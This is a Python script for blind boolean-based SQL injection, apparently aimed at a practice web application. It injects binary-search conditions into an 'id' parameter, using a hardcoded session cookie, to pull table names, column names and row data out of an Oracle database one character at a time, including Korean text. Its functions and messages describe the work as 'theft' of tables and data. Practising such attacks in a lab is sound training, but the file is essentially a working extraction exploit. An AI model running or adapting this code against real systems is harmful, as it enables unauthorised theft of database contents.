import requests
from urllib import parse

url = "https://elms2.skinfosec.co.kr:8110/practice/practice01/detail?id=62+and+{}"

cookies={
    "JSESSIONID":"799396AB33D24E3C09ADC3D18FFD3F5F"
}

headers = {
  "Content-Type": "application/x-www-form-urlencoded"
}

bnEnd = 18000
asciiEnd = 128
hanStart = 15380608
hanEnd = 15572643
name_dict = {"tables": "테이블", "columns": "컬럼", "datas": "데이터"}

def bnSearch(q, endNum):
    frameQuery = "("+ q + ") > {}"
    end = endNum
    start = 1
    
    if endNum == hanEnd: start = hanStart
        
    while start < end:
        avg = int((start + end) / 2)
        atQuery = frameQuery.format(avg)
        atURL = url.format(atQuery)
        res = requests.get(atURL, cookies=cookies)

        if "권한이" in res.text:
            print("쿠키값 새로 넣기")
            break
        if "MacBook" in res.text: start = avg + 1
        else: end = avg
        
    if start > 127:
        if endNum == asciiEnd: start = bnSearch(q, hanEnd)
        elif endNum == hanEnd:
            hangul = hangulDecode(start)
            return hangul
                    
    return start


def dataSearch(target, table="", column=""):
    targetList = []
    
    if target == "tables":
        (name, selectFrom) = ("table_name", "user_tables")
    elif target == "columns":
        (name, selectFrom) = ("column_name", "all_tab_columns where table_name ='{}'".format(table))
    elif target == "datas":
        (name, selectFrom) = (column, table)
    
    countQuery = "select count({}) from {}"
    lengthQuery = "select length({}) from (select {}, rownum as ln from {}) where ln = {}"
    asciiQuery = "select ascii(substr({}, {}, 1)) from (select {}, rownum as ln from {}) where ln = {}"

    dataCount = bnSearch(countQuery.format(name, selectFrom), bnEnd)
    print("{}의 개수: {}" .format(name_dict[target], dataCount))
    
    for i in range(1, dataCount + 1):
        dataName = ""
        dataLen = bnSearch(lengthQuery.format(name, name, selectFrom, i), bnEnd)
        for j in range(1, dataLen+1):
            dataAscii = bnSearch(asciiQuery.format(name, j, name, selectFrom, i), asciiEnd)
            if isinstance(dataAscii, int):
                dataName = dataName + chr(dataAscii)
            else:
                dataName = dataName + dataAscii
 
        targetList.append(dataName)
        print("|{:>2}| {}".format(i, targetList[i-1]))    
    return targetList


def hangulDecode(data):
    ch = hex(data)[2:]
    a = ""

    for i in ch[:2],ch[2:4],ch[4:]:
        a = a + '%{}'.format(i)  
    return parse.unquote(a)

    
def main():
    print("======= 프로그램 시작: 테이블 탈취 =======")   
    tableList=['BAG', 'MEMBER', 'MEMBER_ROLE', 'NOTICE', 'PRODUCT', 'PRODUCTIMG', 'QNA', 'ROLE', 'ORDERLIST', 'COUPONLIST', 'COUPON', 'ACCESS_LOG']
    # tableList = dataSearch("tables")
    return tableList
    
def mainColumn(tablename):
    print("======= {} 테이블의 컬럼 탈취 =======".format(tablename))   
    columnList = dataSearch("columns", table=tablename)
    return columnList

def mainData(tablename, columnname):
    print("======= {} 테이블 {} 컬럼의 데이터 탈취 =======".format(tablename,columnname))  
    dataList = dataSearch("datas", table=tablename, column=columnname)
    return dataList
